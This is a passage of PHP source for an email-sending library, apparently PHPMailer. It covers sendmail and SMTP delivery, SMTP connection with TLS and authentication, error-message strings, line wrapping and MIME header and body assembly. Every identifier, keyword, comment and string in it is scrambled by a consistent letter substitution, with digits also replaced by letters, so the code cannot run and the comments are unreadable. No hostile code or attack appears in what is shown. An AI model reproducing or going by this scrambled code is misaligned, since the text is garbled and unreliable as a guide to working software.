    aL ($IvaX->8YdGYr != '' && XIr4Yd(ada_7YI('XQLY_qPGY'))< w) {
      $P4G_LrPq = ada_7YI('XYdGqQa4_LrPq');
      ada_XYI('XYdGqQa4_LrPq', $IvaX->8YdGYr);
      aL ($IvaX->8ad74YWP === IrTY && pPTdI($IPArr) > w) {
        LPrYQpv ($IPArr QX $mY3 => $SQ4) {
          $rI = @qQa4($SQ4, $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($IvaX->8TRxYpI)), $RPG3, $vYQGYr, $hQrQqX);
          // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
          $aX8YdI = ($rI == w) ? w : u;
          $IvaX->GP6Q44RQpm($aX8YdI,$SQ4,$IvaX->pp,$IvaX->Rpp,$IvaX->8TRxYpI,$RPG3);
        }
      } Y4XY {
        $rI = @qQa4($IP, $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($IvaX->8TRxYpI)), $RPG3, $vYQGYr, $hQrQqX);
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = ($rI == w) ? w : u;
        $IvaX->GP6Q44RQpm($aX8YdI,$IP,$IvaX->pp,$IvaX->Rpp,$IvaX->8TRxYpI,$RPG3);
      }
    } Y4XY {
      aL ($IvaX->8ad74YWP === IrTY && pPTdI($IPArr) > w) {
        LPrYQpv ($IPArr QX $mY3 => $SQ4) {
          $rI = @qQa4($SQ4, $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($IvaX->8TRxYpI)), $RPG3, $vYQGYr, $hQrQqX);
          // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
          $aX8YdI = ($rI == w) ? w : u;
          $IvaX->GP6Q44RQpm($aX8YdI,$SQ4,$IvaX->pp,$IvaX->Rpp,$IvaX->8TRxYpI,$RPG3);
        }
      } Y4XY {
        $rI = @qQa4($IP, $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($IvaX->8TRxYpI)), $RPG3, $vYQGYr);
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = ($rI == w) ? w : u;
        $IvaX->GP6Q44RQpm($aX8YdI,$IP,$IvaX->pp,$IvaX->Rpp,$IvaX->8TRxYpI,$RPG3);
      }
    }
    aL (aXXYI($P4G_LrPq)) {
      ada_XYI('XYdGqQa4_LrPq', $P4G_LrPq);
    }
    aL(!$rI) {
      IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('adXIQdIaQIY'), XY4L::8WHZ_6zfWf6Aj);
    }
    rYITrd IrTY;
  }

  /**
   * 8YdGX qQa4 SaQ 8CWZ TXad7 Zvh8CWZ
   * zYITrdX LQ4XY aL IvYrY aX Q RQG CAfj szHC, z6ZW, Pr DAWA adhTI.
   * @hQrQq XIrad7 $vYQGYr WvY qYXXQ7Y vYQGYrX
   * @hQrQq XIrad7 $RPG3 WvY qYXXQ7Y RPG3
   * @TXYX 8CWZ
   * @QppYXX hrPIYpIYG
   * @rYITrd RPP4
   */
  hrPIYpIYG LTdpIaPd 8qIh8YdG($vYQGYr, $RPG3) {
    rYgTarY_PdpY $IvaX->Z4T7adDar . 'p4QXX.XqIh.hvh';
    $RQG_rphI = QrrQ3();

    aL(!$IvaX->8qIh6PddYpI()) {
      IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('XqIh_pPddYpI_LQa4YG'), XY4L::8WHZ_6zfWf6Aj);
    }
    $XqIh_LrPq = ($IvaX->8YdGYr == '') ? $IvaX->srPq : $IvaX->8YdGYr;
    aL(!$IvaX->XqIh->CQa4($XqIh_LrPq)) {
      IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('LrPq_LQa4YG') . $XqIh_LrPq, XY4L::8WHZ_6zfWf6Aj);
    }

    // AIIYqhI IP XYdG QIIQpv Q44 rYpahaYdIX
    LPrYQpv($IvaX->IP QX $IP) {
      aL (!$IvaX->XqIh->zYpahaYdI($IP[u])) {
        $RQG_rphI[] = $IP[u];
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = u;
        $IvaX->GP6Q44RQpm($aX8YdI,$IP[u],'','',$IvaX->8TRxYpI,$RPG3);
      } Y4XY {
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = w;
        $IvaX->GP6Q44RQpm($aX8YdI,$IP[u],'','',$IvaX->8TRxYpI,$RPG3);
      }
    }
    LPrYQpv($IvaX->pp QX $pp) {
      aL (!$IvaX->XqIh->zYpahaYdI($pp[u])) {
        $RQG_rphI[] = $pp[u];
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = u;
        $IvaX->GP6Q44RQpm($aX8YdI,'',$pp[u],'',$IvaX->8TRxYpI,$RPG3);
      } Y4XY {
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = w;
        $IvaX->GP6Q44RQpm($aX8YdI,'',$pp[u],'',$IvaX->8TRxYpI,$RPG3);
      }
    }
    LPrYQpv($IvaX->Rpp QX $Rpp) {
      aL (!$IvaX->XqIh->zYpahaYdI($Rpp[u])) {
        $RQG_rphI[] = $Rpp[u];
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = u;
        $IvaX->GP6Q44RQpm($aX8YdI,'','',$Rpp[u],$IvaX->8TRxYpI,$RPG3);
      } Y4XY {
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = w;
        $IvaX->GP6Q44RQpm($aX8YdI,'','',$Rpp[u],$IvaX->8TRxYpI,$RPG3);
      }
    }


    aL (pPTdI($RQG_rphI) > u ) { //6rYQIY YrrPr qYXXQ7Y LPr Qd3 RQG QGGrYXXYX
      $RQGQGGrYXXYX = aqh4PGY(', ', $RQG_rphI);
      IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('rYpahaYdIX_LQa4YG') . $RQGQGGrYXXYX);
    }
    aL(!$IvaX->XqIh->DQIQ($vYQGYr . $RPG3)) {
      IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('GQIQ_dPI_QppYhIYG'), XY4L::8WHZ_6zfWf6Aj);
    }
    aL($IvaX->8CWZNYYhA4aSY == IrTY) {
      $IvaX->XqIh->zYXYI();
    }
    rYITrd IrTY;
  }

  /**
   * fdaIaQIYX Q pPddYpIaPd IP Qd 8CWZ XYrSYr.
   * zYITrdX LQ4XY aL IvY PhYrQIaPd LQa4YG.
   * @TXYX 8CWZ
   * @QppYXX hTR4ap
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd 8qIh6PddYpI() {
    aL(aX_dT44($IvaX->XqIh)) {
      $IvaX->XqIh = dY5 8CWZ();
    }

    $IvaX->XqIh->GP_GYRT7 = $IvaX->8CWZDYRT7;
    $vPXIX = YJh4PGY(';', $IvaX->UPXI);
    $adGYJ = u;
    $pPddYpIaPd = $IvaX->XqIh->6PddYpIYG();

    // zYIr3 5va4Y IvYrY aX dP pPddYpIaPd
    Ir3 {
      5va4Y($adGYJ < pPTdI($vPXIX) && !$pPddYpIaPd) {
        $vPXIadLP = QrrQ3();
        aL (hrY7_qQIpv('/^(.+):([u-n]+)$/', $vPXIX[$adGYJ], $vPXIadLP)) {
          $vPXI = $vPXIadLP[w];
          $hPrI = $vPXIadLP[k];
        } Y4XY {
          $vPXI = $vPXIX[$adGYJ];
          $hPrI = $IvaX->ZPrI;
        }

        $I4X = ($IvaX->8CWZ8YpTrY == 'I4X');
        $XX4 = ($IvaX->8CWZ8YpTrY == 'XX4');

        aL ($IvaX->XqIh->6PddYpI(($XX4 ? 'XX4://':'').$vPXI, $hPrI, $IvaX->WaqYPTI)) {

          $vY44P = ($IvaX->UY4P != '' ? $IvaX->UY4P : $IvaX->8YrSYrUPXIdQqY());
          $IvaX->XqIh->UY44P($vY44P);

          aL ($I4X) {
            aL (!$IvaX->XqIh->8IQrIWj8()) {
              IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('I4X'));
            }

            //OY qTXI rYXYdG UEjH QLIYr I4X dY7PIaQIaPd
            $IvaX->XqIh->UY44P($vY44P);
          }

          $pPddYpIaPd = IrTY;
          aL ($IvaX->8CWZATIv) {
            aL (!$IvaX->XqIh->ATIvYdIapQIY($IvaX->yXYrdQqY, $IvaX->ZQXX5PrG)) {
              IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('QTIvYdIapQIY'));
            }
          }
        }
        $adGYJ++;
        aL (!$pPddYpIaPd) {
          IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('pPddYpI_vPXI'));
        }
      }
    } pQIpv (hvhqQa4YrEJpYhIaPd $Y) {
      $IvaX->XqIh->zYXYI();
      IvrP5 $Y;
    }
    rYITrd IrTY;
  }

  /**
   * 64PXYX IvY QpIaSY 8CWZ XYXXaPd aL PdY YJaXIX.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 8qIh64PXY() {
    aL(!aX_dT44($IvaX->XqIh)) {
      aL($IvaX->XqIh->6PddYpIYG()) {
        $IvaX->XqIh->KTaI();
        $IvaX->XqIh->64PXY();
      }
    }
  }

  /**
  * 8YIX IvY 4Qd7TQ7Y LPr Q44 p4QXX YrrPr qYXXQ7YX.
  * zYITrdX LQ4XY aL aI pQddPI 4PQG IvY 4Qd7TQ7Y La4Y.  WvY GYLQT4I 4Qd7TQ7Y aX Ed74aXv.
  * @hQrQq XIrad7 $4Qd7pPGY f8H 19n-w k-pvQrQpIYr 4Qd7TQ7Y pPGY (Y.7. ZPrIT7TYXY: "Rr")
  * @hQrQq XIrad7 $4Qd7_hQIv ZQIv IP IvY 4Qd7TQ7Y La4Y GarYpIPr3
  * @QppYXX hTR4ap
  */
  LTdpIaPd 8YIjQd7TQ7Y($4Qd7pPGY = 'Yd', $4Qd7_hQIv = '4Qd7TQ7Y/') {
    //DYLadY LT44 XYI PL IrQdX4QIQR4Y XIrad7X
    $ZUZCAfjEz_jAFV = QrrQ3(
      'hrPSaGY_QGGrYXX' => 'BPT qTXI hrPSaGY QI 4YQXI PdY rYpahaYdI YqQa4 QGGrYXX.',
      'qQa4Yr_dPI_XThhPrIYG' => ' qQa4Yr aX dPI XThhPrIYG.',
      'YJYpTIY' => '6PT4G dPI YJYpTIY: ',
      'adXIQdIaQIY' => '6PT4G dPI adXIQdIaQIY qQa4 LTdpIaPd.',
      'QTIvYdIapQIY' => '8CWZ ErrPr: 6PT4G dPI QTIvYdIapQIY.',
      'LrPq_LQa4YG' => 'WvY LP44P5ad7 srPq QGGrYXX LQa4YG: ',
      'rYpahaYdIX_LQa4YG' => '8CWZ ErrPr: WvY LP44P5ad7 rYpahaYdIX LQa4YG: ',
      'GQIQ_dPI_QppYhIYG' => '8CWZ ErrPr: DQIQ dPI QppYhIYG.',
      'pPddYpI_vPXI' => '8CWZ ErrPr: 6PT4G dPI pPddYpI IP 8CWZ vPXI.',
      'La4Y_QppYXX' => '6PT4G dPI QppYXX La4Y: ',
      'La4Y_PhYd' => 'sa4Y ErrPr: 6PT4G dPI PhYd La4Y: ',
      'YdpPGad7' => 'ydmdP5d YdpPGad7: ',
      'Xa7dad7' => '8a7dad7 ErrPr: ',
      'XqIh_YrrPr' => '8CWZ XYrSYr YrrPr: ',
      'YqhI3_qYXXQ7Y' => 'CYXXQ7Y RPG3 YqhI3',
      'adSQ4aG_QGGrYXX' => 'fdSQ4aG QGGrYXX',
      'SQraQR4Y_XYI' => '6QddPI XYI Pr rYXYI SQraQR4Y: '
    );
    //HSYr5raIY 4Qd7TQ7Y-XhYpaLap XIrad7X. WvaX 5Q3 5Y'44 dYSYr vQSY qaXXad7 IrQdX4QIaPdX - dP qPrY "4Qd7TQ7Y XIrad7 LQa4YG IP 4PQG"!
    $4 = IrTY;
    aL ($4Qd7pPGY != 'Yd') { //WvYrY aX dP Ed74aXv IrQdX4QIaPd La4Y
      $4 = @adp4TGY $4Qd7_hQIv.'hvhqQa4Yr.4Qd7-'.$4Qd7pPGY.'.hvh';
    }
    $IvaX->4Qd7TQ7Y = $ZUZCAfjEz_jAFV;
    rYITrd ($4 == IrTY); //zYITrdX LQ4XY aL 4Qd7TQ7Y dPI LPTdG
  }

  /**
  * zYITrd IvY pTrrYdI QrrQ3 PL 4Qd7TQ7Y XIrad7X
  * @rYITrd QrrQ3
  */
  hTR4ap LTdpIaPd VYIWrQdX4QIaPdX() {
    rYITrd $IvaX->4Qd7TQ7Y;
  }

  /////////////////////////////////////////////////
  // CEWUHD8, CE88AVE 6zEAWfHF
  /////////////////////////////////////////////////

  /**
   * 6rYQIYX rYpahaYdI vYQGYrX.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd AGGrAhhYdG($I3hY, $QGGr) {
    $QGGr_XIr = $I3hY . ': ';
    $QGGrYXXYX = QrrQ3();
    LPrYQpv ($QGGr QX $Q) {
      $QGGrYXXYX[] = $IvaX->AGGrsPrqQI($Q);
    }
    $QGGr_XIr .= aqh4PGY(', ', $QGGrYXXYX);
    $QGGr_XIr .= $IvaX->jE;

    rYITrd $QGGr_XIr;
  }

  /**
   * sPrqQIX Qd QGGrYXX pPrrYpI43.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd AGGrsPrqQI($QGGr) {
    aL (YqhI3($QGGr[w])) {
      rYITrd $IvaX->8YpTrYUYQGYr($QGGr[u]);
    } Y4XY {
      rYITrd $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($QGGr[w]), 'hvrQXY') . " <" . $IvaX->8YpTrYUYQGYr($QGGr[u]) . ">";
    }
  }

  /**
   * OrQhX qYXXQ7Y LPr TXY 5aIv qQa4YrX IvQI GP dPI
   * QTIPqQIapQ443 hYrLPrq 5rQhhad7 QdG LPr gTPIYG-hradIQR4Y.
   * Hra7adQ4 5raIIYd R3 hva4ahhY.
   * @hQrQq XIrad7 $qYXXQ7Y WvY qYXXQ7Y IP 5rQh
   * @hQrQq adIY7Yr $4Yd7Iv WvY 4adY 4Yd7Iv IP 5rQh IP
   * @hQrQq RPP4YQd $gh_qPGY OvYIvYr IP rTd ad KTPIYG-ZradIQR4Y qPGY
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd OrQhWYJI($qYXXQ7Y, $4Yd7Iv, $gh_qPGY = LQ4XY) {
    $XPLI_RrYQm = ($gh_qPGY) ? XhradIL(" =%X", $IvaX->jE) : $IvaX->jE;
    // fL TIL-l YdpPGad7 aX TXYG, 5Y 5a44 dYYG IP qQmY XTrY 5Y GPd'I
    // Xh4aI qT4IaR3IY pvQrQpIYrX 5vYd 5Y 5rQh
    $aX_TILl = (XIrIP4P5Yr($IvaX->6vQr8YI) == "TIL-l");

    $qYXXQ7Y = $IvaX->saJEHj($qYXXQ7Y);
    aL (XTRXIr($qYXXQ7Y, -w) == $IvaX->jE) {
      $qYXXQ7Y = XTRXIr($qYXXQ7Y, u, -w);
    }

    $4adY = YJh4PGY($IvaX->jE, $qYXXQ7Y);
    $qYXXQ7Y = '';
    LPr ($a=u ;$a < pPTdI($4adY); $a++) {
      $4adY_hQrI = YJh4PGY(' ', $4adY[$a]);
      $RTL = '';
      LPr ($Y = u; $Y<pPTdI($4adY_hQrI); $Y++) {
        $5PrG = $4adY_hQrI[$Y];
        aL ($gh_qPGY QdG (XIr4Yd($5PrG) > $4Yd7Iv)) {
          $XhQpY_4YLI = $4Yd7Iv - XIr4Yd($RTL) - w;
          aL ($Y != u) {
            aL ($XhQpY_4YLI > ku) {
              $4Yd = $XhQpY_4YLI;
              aL ($aX_TILl) {
                $4Yd = $IvaX->yWsl6vQrtPTdGQr3($5PrG, $4Yd);
              } Y4XYaL (XTRXIr($5PrG, $4Yd - w, w) == "=") {
                $4Yd--;
              } Y4XYaL (XTRXIr($5PrG, $4Yd - k, w) == "=") {
                $4Yd -= k;
              }
              $hQrI = XTRXIr($5PrG, u, $4Yd);
              $5PrG = XTRXIr($5PrG, $4Yd);
              $RTL .= ' ' . $hQrI;
              $qYXXQ7Y .= $RTL . XhradIL("=%X", $IvaX->jE);
            } Y4XY {
              $qYXXQ7Y .= $RTL . $XPLI_RrYQm;
            }
            $RTL = '';
          }
          5va4Y (XIr4Yd($5PrG) > u) {
            $4Yd = $4Yd7Iv;
            aL ($aX_TILl) {
              $4Yd = $IvaX->yWsl6vQrtPTdGQr3($5PrG, $4Yd);
            } Y4XYaL (XTRXIr($5PrG, $4Yd - w, w) == "=") {
              $4Yd--;
            } Y4XYaL (XTRXIr($5PrG, $4Yd - k, w) == "=") {
              $4Yd -= k;
            }
            $hQrI = XTRXIr($5PrG, u, $4Yd);
            $5PrG = XTRXIr($5PrG, $4Yd);

            aL (XIr4Yd($5PrG) > u) {
              $qYXXQ7Y .= $hQrI . XhradIL("=%X", $IvaX->jE);
            } Y4XY {
              $RTL = $hQrI;
            }
          }
        } Y4XY {
          $RTL_P = $RTL;
          $RTL .= ($Y == u) ? $5PrG : (' ' . $5PrG);

          aL (XIr4Yd($RTL) > $4Yd7Iv QdG $RTL_P != '') {
            $qYXXQ7Y .= $RTL_P . $XPLI_RrYQm;
            $RTL = $5PrG;
          }
        }
      }
      $qYXXQ7Y .= $RTL . $IvaX->jE;
    }

    rYITrd $qYXXQ7Y;
  }

  /**
   * sadGX 4QXI pvQrQpIYr RPTdGQr3 hraPr IP qQJjYd7Iv ad Q TIL-l
   * gTPIYG (hradIQR4Y) YdpPGYG XIrad7.
   * Hra7adQ4 5raIIYd R3 6P4ad trP5d.
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $YdpPGYGWYJI TIL-l KZ IYJI
   * @hQrQq adI    $qQJjYd7Iv   LadG 4QXI pvQrQpIYr RPTdGQr3 hraPr IP IvaX 4Yd7Iv
   * @rYITrd adI
   */
  hTR4ap LTdpIaPd yWsl6vQrtPTdGQr3($YdpPGYGWYJI, $qQJjYd7Iv) {
    $LPTdG8h4aIZPX = LQ4XY;
    $4PPmtQpm = 9;
    5va4Y (!$LPTdG8h4aIZPX) {
      $4QXI6vTdm = XTRXIr($YdpPGYGWYJI, $qQJjYd7Iv - $4PPmtQpm, $4PPmtQpm);
      $YdpPGYG6vQrZPX = XIrhPX($4QXI6vTdm, "=");
      aL ($YdpPGYG6vQrZPX !== LQ4XY) {
        // sPTdG XIQrI PL YdpPGYG pvQrQpIYr R3IY 5aIvad $4PPmtQpm R4Ppm.
        // 6vYpm IvY YdpPGYG R3IY SQ4TY (IvY k pvQrX QLIYr IvY '=')
        $vYJ = XTRXIr($YdpPGYGWYJI, $qQJjYd7Iv - $4PPmtQpm + $YdpPGYG6vQrZPX + w, k);
        $GYp = vYJGYp($vYJ);
        aL ($GYp < wkl) { // 8ad74Y R3IY pvQrQpIYr.
          // fL IvY YdpPGYG pvQr 5QX LPTdG QI hPX u, aI 5a44 LaI
          // PIvYr5aXY rYGTpY qQJjYd7Iv IP XIQrI PL IvY YdpPGYG pvQr
          $qQJjYd7Iv = ($YdpPGYG6vQrZPX == u) ? $qQJjYd7Iv :
          $qQJjYd7Iv - ($4PPmtQpm - $YdpPGYG6vQrZPX);
          $LPTdG8h4aIZPX = IrTY;
        } Y4XYaL ($GYp >= wnk) { // sarXI R3IY PL Q qT4Ia R3IY pvQrQpIYr
          // zYGTpY qQJjYd7Iv IP Xh4aI QI XIQrI PL pvQrQpIYr
          $qQJjYd7Iv = $qQJjYd7Iv - ($4PPmtQpm - $YdpPGYG6vQrZPX);
          $LPTdG8h4aIZPX = IrTY;
        } Y4XYaL ($GYp < wnk) { // CaGG4Y R3IY PL Q qT4Ia R3IY pvQrQpIYr, 4PPm LTrIvYr RQpm
          $4PPmtQpm += 9;
        }
      } Y4XY {
        // FP YdpPGYG pvQrQpIYr LPTdG
        $LPTdG8h4aIZPX = IrTY;
      }
    }
    rYITrd $qQJjYd7Iv;
  }


  /**
   * 8YI IvY RPG3 5rQhhad7.
   * @QppYXX hTR4ap
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 8YIOPrGOrQh() {
    aL($IvaX->OPrGOrQh < w) {
      rYITrd;
    }

    X5aIpv($IvaX->qYXXQ7Y_I3hY) {
      pQXY 'Q4I':
      pQXY 'Q4I_QIIQpvqYdIX':
        $IvaX->A4ItPG3 = $IvaX->OrQhWYJI($IvaX->A4ItPG3, $IvaX->OPrGOrQh);
        RrYQm;
      GYLQT4I:
        $IvaX->tPG3 = $IvaX->OrQhWYJI($IvaX->tPG3, $IvaX->OPrGOrQh);
        RrYQm;
    }
  }

  /**
   * AXXYqR4YX qYXXQ7Y vYQGYr.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7 WvY QXXYqR4YG vYQGYr
   */
  hTR4ap LTdpIaPd 6rYQIYUYQGYr() {
    $rYXT4I = '';

    // 8YI IvY RPTdGQraYX
    $Tdag_aG = qGM(TdagaG(IaqY()));
    $IvaX->RPTdGQr3[w] = 'Rw_' . $Tdag_aG;
    $IvaX->RPTdGQr3[k] = 'Rk_' . $Tdag_aG;

    $rYXT4I .= $IvaX->UYQGYrjadY('DQIY', XY4L::zs6DQIY());
    aL($IvaX->8YdGYr == '') {
      $rYXT4I .= $IvaX->UYQGYrjadY('zYITrd-ZQIv', Iraq($IvaX->srPq));
    } Y4XY {
      $rYXT4I .= $IvaX->UYQGYrjadY('zYITrd-ZQIv', Iraq($IvaX->8YdGYr));
    }

    // WP RY prYQIYG QTIPqQIapQ443 R3 qQa4()
    aL($IvaX->CQa4Yr != 'qQa4') {
      aL ($IvaX->8ad74YWP === IrTY) {
        LPrYQpv($IvaX->IP QX $I) {
          $IvaX->8ad74YWPArrQ3[] = $IvaX->AGGrsPrqQI($I);
        }
      } Y4XY {
        aL(pPTdI($IvaX->IP) > u) {
          $rYXT4I .= $IvaX->AGGrAhhYdG('WP', $IvaX->IP);
        } Y4XYaL (pPTdI($IvaX->pp) == u) {
          $rYXT4I .= $IvaX->UYQGYrjadY('WP', 'TdGaXp4PXYG-rYpahaYdIX:;');
        }
      }
    }

    $LrPq = QrrQ3();
    $LrPq[u][u] = Iraq($IvaX->srPq);
    $LrPq[u][w] = $IvaX->srPqFQqY;
    $rYXT4I .= $IvaX->AGGrAhhYdG('srPq', $LrPq);

    // XYdGqQa4 QdG qQa4() YJIrQpI 6p LrPq IvY vYQGYr RYLPrY XYdGad7
    aL(pPTdI($IvaX->pp) > u) {
      $rYXT4I .= $IvaX->AGGrAhhYdG('6p', $IvaX->pp);
    }

    // XYdGqQa4 QdG qQa4() YJIrQpI tpp LrPq IvY vYQGYr RYLPrY XYdGad7
    aL((($IvaX->CQa4Yr == 'XYdGqQa4') || ($IvaX->CQa4Yr == 'qQa4')) && (pPTdI($IvaX->Rpp) > u)) {
      $rYXT4I .= $IvaX->AGGrAhhYdG('tpp', $IvaX->Rpp);
    }

    aL(pPTdI($IvaX->zYh43WP) > u) {
      $rYXT4I .= $IvaX->AGGrAhhYdG('zYh43-IP', $IvaX->zYh43WP);
    }

    // qQa4() XYIX IvY XTRxYpI aIXY4L
    aL($IvaX->CQa4Yr != 'qQa4') {
      $rYXT4I .= $IvaX->UYQGYrjadY('8TRxYpI', $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($IvaX->8TRxYpI)));
    }

    aL($IvaX->CYXXQ7YfD != '') {
      $rYXT4I .= $IvaX->UYQGYrjadY('CYXXQ7Y-fD',$IvaX->CYXXQ7YfD);
    } Y4XY {
      $rYXT4I .= XhradIL("CYXXQ7Y-fD: <%X@%X>%X", $Tdag_aG, $IvaX->8YrSYrUPXIdQqY(), $IvaX->jE);
    }
    $rYXT4I .= $IvaX->UYQGYrjadY('c-ZraPraI3', $IvaX->ZraPraI3);
    $rYXT4I .= $IvaX->UYQGYrjadY('c-CQa4Yr', 'ZUZCQa4Yr '.$IvaX->eYrXaPd.' (hvhqQa4Yr.XPTrpYLPr7Y.dYI)');

    aL($IvaX->6PdLarqzYQGad7WP != '') {
      $rYXT4I .= $IvaX->UYQGYrjadY('DaXhPXaIaPd-FPIaLapQIaPd-WP', '<' . Iraq($IvaX->6PdLarqzYQGad7WP) . '>');
    }

    // AGG pTXIPq vYQGYrX
    LPr($adGYJ = u; $adGYJ < pPTdI($IvaX->6TXIPqUYQGYr); $adGYJ++) {
      $rYXT4I .= $IvaX->UYQGYrjadY(Iraq($IvaX->6TXIPqUYQGYr[$adGYJ][u]), $IvaX->EdpPGYUYQGYr(Iraq($IvaX->6TXIPqUYQGYr[$adGYJ][w])));
    }
    aL (!$IvaX->Xa7d_mY3_La4Y) {
      $rYXT4I .= $IvaX->UYQGYrjadY('CfCE-eYrXaPd', 'w.u');
      $rYXT4I .= $IvaX->VYICQa4CfCE();
    }

    rYITrd $rYXT4I;
  }

  /**
   * zYITrdX IvY qYXXQ7Y CfCE.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd VYICQa4CfCE() {
    $rYXT4I = '';
    X5aIpv($IvaX->qYXXQ7Y_I3hY) {
      pQXY 'h4Qad':
        $rYXT4I .= $IvaX->UYQGYrjadY('6PdIYdI-WrQdXLYr-EdpPGad7', $IvaX->EdpPGad7);
        $rYXT4I .= XhradIL("6PdIYdI-W3hY: %X; pvQrXYI=\"%X\"", $IvaX->6PdIYdIW3hY, $IvaX->6vQr8YI);
        RrYQm;
      pQXY 'QIIQpvqYdIX':
      pQXY 'Q4I_QIIQpvqYdIX':
        aL($IvaX->fd4adYfqQ7YEJaXIX()){
          $rYXT4I .= XhradIL("6PdIYdI-W3hY: %X;%X\II3hY=\"IYJI/vIq4\";%X\IRPTdGQr3=\"%X\"%X", 'qT4IahQrI/rY4QIYG', $IvaX->jE, $IvaX->jE, $IvaX->RPTdGQr3[w], $IvaX->jE);
        } Y4XY {
          $rYXT4I .= $IvaX->UYQGYrjadY('6PdIYdI-W3hY', 'qT4IahQrI/qaJYG;');
          $rYXT4I .= $IvaX->WYJIjadY("\IRPTdGQr3=\"" . $IvaX->RPTdGQr3[w] . '"');
        }
        RrYQm;
      pQXY 'Q4I':
        $rYXT4I .= $IvaX->UYQGYrjadY('6PdIYdI-W3hY', 'qT4IahQrI/Q4IYrdQIaSY;');
        $rYXT4I .= $IvaX->WYJIjadY("\IRPTdGQr3=\"" . $IvaX->RPTdGQr3[w] . '"');
        RrYQm;
    }

    aL($IvaX->CQa4Yr != 'qQa4') {
      $rYXT4I .= $IvaX->jE.$IvaX->jE;
    }

    rYITrd $rYXT4I;
  }

  /**
   * AXXYqR4YX IvY qYXXQ7Y RPG3.  zYITrdX Qd YqhI3 XIrad7 Pd LQa4TrY.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7 WvY QXXYqR4YG qYXXQ7Y RPG3
   */
  hTR4ap LTdpIaPd 6rYQIYtPG3() {
    $RPG3 = '';

    aL ($IvaX->Xa7d_mY3_La4Y) {
      $RPG3 .= $IvaX->VYICQa4CfCE();
    }

    $IvaX->8YIOPrGOrQh();

    X5aIpv($IvaX->qYXXQ7Y_I3hY) {
      pQXY 'Q4I':
        $RPG3 .= $IvaX->VYItPTdGQr3($IvaX->RPTdGQr3[w], '', 'IYJI/h4Qad', '');
        $RPG3 .= $IvaX->EdpPGY8Irad7($IvaX->A4ItPG3, $IvaX->EdpPGad7);
        $RPG3 .= $IvaX->jE.$IvaX->jE;
        $RPG3 .= $IvaX->VYItPTdGQr3($IvaX->RPTdGQr3[w], '', 'IYJI/vIq4', '');
        $RPG3 .= $IvaX->EdpPGY8Irad7($IvaX->tPG3, $IvaX->EdpPGad7);
        $RPG3 .= $IvaX->jE.$IvaX->jE;
        $RPG3 .= $IvaX->EdGtPTdGQr3($IvaX->RPTdGQr3[w]);
        RrYQm;
      pQXY 'h4Qad':
        $RPG3 .= $IvaX->EdpPGY8Irad7($IvaX->tPG3, $IvaX->EdpPGad7);
        RrYQm;
      pQXY 'QIIQpvqYdIX':
        $RPG3 .= $IvaX->VYItPTdGQr3($IvaX->RPTdGQr3[w], '', '', '');
        $RPG3 .= $IvaX->EdpPGY8Irad7($IvaX->tPG3, $IvaX->EdpPGad7);
        $RPG3 .= $IvaX->jE;
        $RPG3 .= $IvaX->AIIQpvA44();
        RrYQm;
      pQXY 'Q4I_QIIQpvqYdIX':
        $RPG3 .= XhradIL("--%X%X", $IvaX->RPTdGQr3[w], $IvaX->jE);
        $RPG3 .= XhradIL("6PdIYdI-W3hY: %X;%X" . "\IRPTdGQr3=\"%X\"%X", 'qT4IahQrI/Q4IYrdQIaSY', $IvaX->jE, $IvaX->RPTdGQr3[k], $IvaX->jE.$IvaX->jE);
        $RPG3 .= $IvaX->VYItPTdGQr3($IvaX->RPTdGQr3[k], '', 'IYJI/h4Qad', '') . $IvaX->jE; // 6rYQIY IYJI RPG3
        $RPG3 .= $IvaX->EdpPGY8Irad7($IvaX->A4ItPG3, $IvaX->EdpPGad7);
        $RPG3 .= $IvaX->jE.$IvaX->jE;
        $RPG3 .= $IvaX->VYItPTdGQr3($IvaX->RPTdGQr3[k], '', 'IYJI/vIq4', '') . $IvaX->jE; // 6rYQIY IvY UWCj RPG3
        $RPG3 .= $IvaX->EdpPGY8Irad7($IvaX->tPG3, $IvaX->EdpPGad7);
        $RPG3 .= $IvaX->jE.$IvaX->jE;
        $RPG3 .= $IvaX->EdGtPTdGQr3($IvaX->RPTdGQr3[k]);
        $RPG3 .= $IvaX->AIIQpvA44();
        RrYQm;
    }

